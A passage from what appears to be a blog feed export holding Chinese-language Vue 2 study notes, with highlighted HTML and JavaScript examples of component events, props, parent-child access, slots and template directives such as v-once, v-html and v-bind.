class="string">&quot;cpnclick&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&quot;mycpn2&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">v-for</span>=<span class="string">&quot;item in categories&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;btnClick(item)&quot;</span>&gt;</span>&#123;&#123;item.name&#125;&#125;<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> cpn = &#123;</span></span><br><span class="line"><span class="javascript">        template: <span class="string">&#x27;#mycpn2&#x27;</span>,</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span>&#123;</span></span><br><span class="line">                categories: [</span><br><span class="line"><span class="javascript">                    &#123;<span class="attr">id</span>: <span class="string">&#x27;aaa&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;test1&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">                    &#123;<span class="attr">id</span>: <span class="string">&#x27;bbb&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;test2&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">                    &#123;<span class="attr">id</span>: <span class="string">&#x27;ccc&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;test3&#x27;</span>&#125;,</span></span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">btnClick</span>(<span class="params">item</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.$emit(<span class="string">&#x27;itemclick&#x27;</span>, item)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line">        components: &#123;</span><br><span class="line">            cpn2: cpn</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="javascript">             <span class="function"><span class="title">cpnclick</span>(<span class="params">item</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">&#x27;父组件收到&#x27;</span>)</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(item)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>父子组件双向绑定</strong></p><p>props的属性只能从父组件传过来，不能在子组件进行model绑定</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&quot;counter&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        props: &#123;&#123;number1&#125;&#125;<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        data: &#123;&#123;cnumber1&#125;&#125;<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;cnumber1&quot;</span> @<span class="attr">input</span>=<span class="string">&quot;update&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        props: &#123;&#123;number2&#125;&#125;<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        data: &#123;&#123;cnumber2&#125;&#125;<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;cnumber2&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line">        data: &#123;</span><br><span class="line">            num1: 0,</span><br><span class="line">            num2: 1</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">updatefather</span>(<span class="params">num</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.num1 = num</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        components: &#123;</span><br><span class="line">            cpn: &#123;</span><br><span class="line"><span class="javascript">                template: <span class="string">&#x27;#counter&#x27;</span>,</span></span><br><span class="line">                props: &#123;</span><br><span class="line"><span class="javascript">                    number1: <span class="built_in">String</span>,</span></span><br><span class="line"><span class="javascript">                    number2: <span class="built_in">String</span></span></span><br><span class="line">                &#125;,</span><br><span class="line"><span class="javascript">                <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="javascript">                        cnumber1: <span class="built_in">this</span>.number1,</span></span><br><span class="line"><span class="javascript">                        cnumber2: <span class="built_in">this</span>.number2</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                methods: &#123;</span><br><span class="line"><span class="javascript">                    <span class="function"><span class="title">update</span>(<span class="params">event</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                        <span class="built_in">this</span>.$emit(<span class="string">&#x27;updatefather&#x27;</span>, event.target.value)</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>监听某个值的改变，可以直接用watch方法</p><p><strong>父子组件互相访问</strong></p><p>父组件访问子组件：使用<code>$children</code>或者<code>$ref</code></p><p>子组件访问父组件：使用<code>$parent</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cpn</span> <span class="attr">ref</span>=<span class="string">&quot;aaa&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;btnClick&quot;</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&quot;cpn&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        子组件</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">btnClick</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.$children[<span class="number">0</span>].showMessage()</span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.$refs[<span class="string">&#x27;aaa&#x27;</span>].showMessage()</span></span><br><span class="line"><span class="javascript">                  <span class="built_in">this</span>.$refs.aaa.showMessage()</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        components: &#123;</span><br><span class="line">            cpn: &#123;</span><br><span class="line"><span class="javascript">                template: <span class="string">&#x27;#cpn&#x27;</span>,</span></span><br><span class="line">                methods: &#123;</span><br><span class="line"><span class="javascript">                    <span class="function"><span class="title">showMessage</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                        <span class="built_in">console</span>.log(<span class="string">&#x27;show message&#x27;</span>)</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="4-slot插槽"><a href="#4-slot插槽" class="headerlink" title="4. slot插槽"></a>4. slot插槽</h1><p>组件的插槽为了让封装的组件更具有扩展性</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;<span class="name">button</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>span标签<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&quot;cpn&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span>子组件<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;<span class="name">button</span>&gt;</span>默认按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line">        components: &#123;</span><br><span class="line">            cpn: &#123;</span><br><span class="line"><span class="javascript">                template: <span class="string">&#x27;#cpn&#x27;</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>具名插槽</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span>=<span class="string">&#x27;left&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">替换方法：</span><br><span class="line"><span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">slot</span>=<span class="string">&#x27;left&#x27;</span>&gt;</span>testme<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>作用域插槽</strong></p><p>父组件替换插槽的标签，但是内容由子组件来提供</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cpn</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">template</span> <span class="attr">slot-scope</span>=<span class="string">&quot;slot&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-for</span>=<span class="string">&quot;item in slot.data&quot;</span>&gt;</span>&#123;&#123;item&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span>  // 数据在子组件中，但是该标签的作用域在父组件里面，需要将内容传递过来</span><br><span class="line">        <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&quot;cpn&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">slot</span> <span class="attr">:data</span>=<span class="string">&quot;pLanguage&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;item in pLanguage&quot;</span>&gt;</span>&#123;&#123;item &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line">        components: &#123;</span><br><span class="line">            cpn: &#123;</span><br><span class="line"><span class="javascript">                template: <span class="string">&#x27;#cpn&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="javascript">                        pLanguage: [<span class="string">&#x27;test1&#x27;</span>, <span class="string">&#x27;test2&#x27;</span>, <span class="string">&#x27;test3&#x27;</span>]</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-filter-map-reduce&quot;&gt;&lt;a href=&quot;#1-filter-map-reduce&quot; class=&quot;headerlink&quot; title=&quot;1. filter/map/reduce&quot;&gt;&lt;/a&gt;1. filter/map/reduce&lt;/h1&gt;&lt;fi</summary>
      
    
    
    
    <category term="Program" scheme="http://blog.le31ei.top/categories/Program/"/>
    
    
    <category term="vue" scheme="http://blog.le31ei.top/tags/vue/"/>
    
  </entry>
  
  <entry>
    <title>vue2学习笔记</title>
    <link href="http://blog.le31ei.top/2021/01/25/vue2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://blog.le31ei.top/2021/01/25/vue2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-01-25T07:16:02.000Z</published>
    <updated>2021-01-25T07:16:02.863Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-模板语法"><a href="#1-模板语法" class="headerlink" title="1.  模板语法"></a>1.  模板语法</h1><h2 id="1-1-常见指令"><a href="#1-1-常见指令" class="headerlink" title="1.1 常见指令"></a>1.1 常见指令</h2><p><strong>v-once</strong></p><p>只渲染一次，后续对值的改动不再变化</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-once</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span>   //后续在console中输入app.message=”xxxx“，该处的值不会发生变化</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line">        data: &#123;</span><br><span class="line"><span class="javascript">            message: <span class="string">&quot;123&quot;</span>  </span></span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>v-html</strong></p><p>对值为html代码的转换成html格式输出</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">&#123;&#123;url&#125;&#125;  // 输出原始字符串格式</span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-html</span>=<span class="string">&quot;url&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span>  // 会对a标签转换成html格式进行输出</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line">        data: &#123;</span><br><span class="line"><span class="javascript">            message: <span class="string">&quot;123&quot;</span>,</span></span><br><span class="line"><span class="handlebars"><span class="xml">            url: &quot;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;https://www.baidu.com&#x27;</span>&gt;</span>百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&quot;</span></span></span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>v-text</strong></p><p>与<code>&#123;&#123;&#125;&#125;`语法相似，接收一个string类型进行输出<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-text</span>=<span class="string">&quot;message&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line">        data: &#123;</span><br><span class="line"><span class="javascript">            message: <span class="string">&quot;123&quot;</span></span></span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>**v-pre**对代码进行原样输出<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-pre</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span>     // 输出内容为&#123;&#123;message&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line">        data: &#123;</span><br><span class="line"><span class="javascript">            message: <span class="string">&quot;123&quot;</span></span></span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>## 1.2 v-bind动态绑定到某个属性上，不能使用`&#123;&#123;&#125;&#125;</code>语法的时候，比如绑定a便签的href属性，img的src属性的情况。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">v-bind:src</span>=<span class="string">&quot;img&quot;</span>/&gt;</span></span><br><span class="line">  //简写</span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span 